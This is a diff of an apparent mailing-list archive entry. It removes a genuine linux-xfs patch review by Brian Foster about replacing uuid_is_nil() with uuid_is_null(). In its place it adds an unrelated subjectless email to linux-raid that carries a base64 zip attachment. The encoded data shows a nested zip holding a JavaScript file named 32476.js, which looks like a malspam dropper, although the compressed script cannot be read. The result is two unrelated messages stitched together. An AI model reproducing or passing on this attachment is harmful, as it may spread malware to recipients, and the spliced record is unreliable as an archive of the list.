@@ -1,209 +1,96 @@
-From: Brian Foster <bfoster-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
-Subject: Re: [PATCH 14/23] xfs: use the common helper uuid_is_null()
-Date: Thu, 18 May 2017 09:27:20 -0400
-Message-ID: <20170518132719.GF18240@bfoster.bfoster>
-References: <20170518062705.25902-1-hch@lst.de>
- <20170518062705.25902-15-hch@lst.de>
+From: <hp@ice-cool.eu>
+Subject: (unknown)
+Date: Thu, 18 May 2017 13:40:44 -0000
+Message-ID: <149511484461.31455.16747453842847204479@permonline.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Return-path: <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-Content-Disposition: inline
-In-Reply-To: <20170518062705.25902-15-hch-jcswGhMUV9g@public.gmane.org>
-List-Unsubscribe: <https://lists.01.org/mailman/options/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=unsubscribe>
-List-Archive: <http://lists.01.org/pipermail/linux-nvdimm/>
-List-Post: <mailto:linux-nvdimm-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-List-Help: <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=help>
-List-Subscribe: <https://lists.01.org/mailman/listinfo/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=subscribe>
-Errors-To: linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org
-Sender: "Linux-nvdimm" <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-To: Christoph Hellwig <hch-jcswGhMUV9g@public.gmane.org>
-Cc: linux-xfs-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-raid-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-nvdimm-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org, Mimi Zohar <zohar-23VcF4HTsmIX0ybBhKVfKdBPR1lH4CV8@public.gmane.org>, Amir Goldstein <amir73il-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, David Howells <dhowells-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, linux-fsdevel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Andy Shevchenko <andriy.shevchenko-VuQAYsv1563Yd54FQh9/CA@public.gmane.org>, Shaohua Li <shli-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>, Steven Whitehouse <swhiteho-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
+Content-Type: application/zip; name="2518423.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-raid-owner@vger.kernel.org>
+Subject: 
+Content-Disposition: attachment
+Sender: linux-raid-owner@vger.kernel.org
+To: linux-raid@vger.kernel.org
 List-Id: linux-raid.ids
 
-On Thu, May 18, 2017 at 08:26:56AM +0200, Christoph Hellwig wrote:
-> From: Amir Goldstein <amir73il-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-> 
-> Use the common helper uuid_is_null() and remove the xfs specific
-> helper uuid_is_nil().
-> 
-> The common helper does not check for the NULL pointer value as
-> xfs helper did, but xfs code never calls the helper with a pointer
-> that can be NULL.
-> 
-> Conform comments and warning strings to use the term 'null uuid'
-> instead of 'nil uuid', because this is the terminology used by
-> lib/uuid.c and its users. It is also the terminology used in
-> userspace by libuuid and xfsprogs.
-> 
-> Signed-off-by: Amir Goldstein <amir73il-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-> [hch: remove now unused uuid.[ch]]
-> Signed-off-by: Christoph Hellwig <hch-jcswGhMUV9g@public.gmane.org>
-> ---
-
-Reviewed-by: Brian Foster <bfoster-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
-
->  fs/xfs/Makefile          |  3 +--
->  fs/xfs/uuid.c            | 32 --------------------------------
->  fs/xfs/uuid.h            | 23 -----------------------
->  fs/xfs/xfs_linux.h       |  1 -
->  fs/xfs/xfs_log_recover.c |  6 +++---
->  fs/xfs/xfs_mount.c       |  8 ++++----
->  6 files changed, 8 insertions(+), 65 deletions(-)
->  delete mode 100644 fs/xfs/uuid.c
->  delete mode 100644 fs/xfs/uuid.h
-> 
-> diff --git a/fs/xfs/Makefile b/fs/xfs/Makefile
-> index 5c90f82b8f6b..a6e955bfead8 100644
-> --- a/fs/xfs/Makefile
-> +++ b/fs/xfs/Makefile
-> @@ -98,8 +98,7 @@ xfs-y				+= xfs_aops.o \
->  				   xfs_sysfs.o \
->  				   xfs_trans.o \
->  				   xfs_xattr.o \
-> -				   kmem.o \
-> -				   uuid.o
-> +				   kmem.o
->  
->  # low-level transaction/log code
->  xfs-y				+= xfs_log.o \
-> diff --git a/fs/xfs/uuid.c b/fs/xfs/uuid.c
-> deleted file mode 100644
-> index 737c186ea98b..000000000000
-> --- a/fs/xfs/uuid.c
-> +++ /dev/null
-> @@ -1,32 +0,0 @@
-> -/*
-> - * Copyright (c) 2000-2003,2005 Silicon Graphics, Inc.
-> - * All Rights Reserved.
-> - *
-> - * This program is free software; you can redistribute it and/or
-> - * modify it under the terms of the GNU General Public License as
-> - * published by the Free Software Foundation.
-> - *
-> - * This program is distributed in the hope that it would be useful,
-> - * but WITHOUT ANY WARRANTY; without even the implied warranty of
-> - * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-> - * GNU General Public License for more details.
-> - *
-> - * You should have received a copy of the GNU General Public License
-> - * along with this program; if not, write the Free Software Foundation,
-> - * Inc.,  51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
-> - */
-> -#include <xfs.h>
-> -
-> -int
-> -uuid_is_nil(uuid_t *uuid)
-> -{
-> -	int	i;
-> -	char	*cp = (char *)uuid;
-> -
-> -	if (uuid == NULL)
-> -		return 0;
-> -	/* implied check of version number here... */
-> -	for (i = 0; i < sizeof *uuid; i++)
-> -		if (*cp++) return 0;	/* not nil */
-> -	return 1;	/* is nil */
-> -}
-> diff --git a/fs/xfs/uuid.h b/fs/xfs/uuid.h
-> deleted file mode 100644
-> index 5aea49bf0963..000000000000
-> --- a/fs/xfs/uuid.h
-> +++ /dev/null
-> @@ -1,23 +0,0 @@
-> -/*
-> - * Copyright (c) 2000-2003,2005 Silicon Graphics, Inc.
-> - * All Rights Reserved.
-> - *
-> - * This program is free software; you can redistribute it and/or
-> - * modify it under the terms of the GNU General Public License as
-> - * published by the Free Software Foundation.
-> - *
-> - * This program is distributed in the hope that it would be useful,
-> - * but WITHOUT ANY WARRANTY; without even the implied warranty of
-> - * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-> - * GNU General Public License for more details.
-> - *
-> - * You should have received a copy of the GNU General Public License
-> - * along with this program; if not, write the Free Software Foundation,
-> - * Inc.,  51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
-> - */
-> -#ifndef __XFS_SUPPORT_UUID_H__
-> -#define __XFS_SUPPORT_UUID_H__
-> -
-> -extern int uuid_is_nil(uuid_t *uuid);
-> -
-> -#endif	/* __XFS_SUPPORT_UUID_H__ */
-> diff --git a/fs/xfs/xfs_linux.h b/fs/xfs/xfs_linux.h
-> index 2c33d915e550..2d167fe643ec 100644
-> --- a/fs/xfs/xfs_linux.h
-> +++ b/fs/xfs/xfs_linux.h
-> @@ -43,7 +43,6 @@ typedef __u32			xfs_nlink_t;
->  
->  #include "kmem.h"
->  #include "mrlock.h"
-> -#include "uuid.h"
->  
->  #include <linux/semaphore.h>
->  #include <linux/mm.h>
-> diff --git a/fs/xfs/xfs_log_recover.c b/fs/xfs/xfs_log_recover.c
-> index cd0b077deb35..8cec1e5505a4 100644
-> --- a/fs/xfs/xfs_log_recover.c
-> +++ b/fs/xfs/xfs_log_recover.c
-> @@ -352,13 +352,13 @@ xlog_header_check_mount(
->  {
->  	ASSERT(head->h_magicno == cpu_to_be32(XLOG_HEADER_MAGIC_NUM));
->  
-> -	if (uuid_is_nil(&head->h_fs_uuid)) {
-> +	if (uuid_is_null(&head->h_fs_uuid)) {
->  		/*
->  		 * IRIX doesn't write the h_fs_uuid or h_fmt fields. If
-> -		 * h_fs_uuid is nil, we assume this log was last mounted
-> +		 * h_fs_uuid is null, we assume this log was last mounted
->  		 * by IRIX and continue.
->  		 */
-> -		xfs_warn(mp, "nil uuid in log - IRIX style log");
-> +		xfs_warn(mp, "null uuid in log - IRIX style log");
->  	} else if (unlikely(!uuid_equal(&mp->m_sb.sb_uuid, &head->h_fs_uuid))) {
->  		xfs_warn(mp, "log has mismatched uuid - can't recover");
->  		xlog_header_check_dump(mp, head);
-> diff --git a/fs/xfs/xfs_mount.c b/fs/xfs/xfs_mount.c
-> index 742e4a61c0bc..682b336a7a6a 100644
-> --- a/fs/xfs/xfs_mount.c
-> +++ b/fs/xfs/xfs_mount.c
-> @@ -80,14 +80,14 @@ xfs_uuid_mount(
->  	if (mp->m_flags & XFS_MOUNT_NOUUID)
->  		return 0;
->  
-> -	if (uuid_is_nil(uuid)) {
-> -		xfs_warn(mp, "Filesystem has nil UUID - can't mount");
-> +	if (uuid_is_null(uuid)) {
-> +		xfs_warn(mp, "Filesystem has null UUID - can't mount");
->  		return -EINVAL;
->  	}
->  
->  	mutex_lock(&xfs_uuid_table_mutex);
->  	for (i = 0, hole = -1; i < xfs_uuid_table_size; i++) {
-> -		if (uuid_is_nil(&xfs_uuid_table[i])) {
-> +		if (uuid_is_null(&xfs_uuid_table[i])) {
->  			hole = i;
->  			continue;
->  		}
-> @@ -124,7 +124,7 @@ xfs_uuid_unmount(
->  
->  	mutex_lock(&xfs_uuid_table_mutex);
->  	for (i = 0; i < xfs_uuid_table_size; i++) {
-> -		if (uuid_is_nil(&xfs_uuid_table[i]))
-> +		if (uuid_is_null(&xfs_uuid_table[i]))
->  			continue;
->  		if (!uuid_equal(uuid, &xfs_uuid_table[i]))
->  			continue;
-> -- 
-> 2.11.0
-> 
-> --
-> To unsubscribe from this list: send the line "unsubscribe linux-xfs" in
-> the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-> More majordomo info at  http://vger.kernel.org/majordomo-info.html
+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
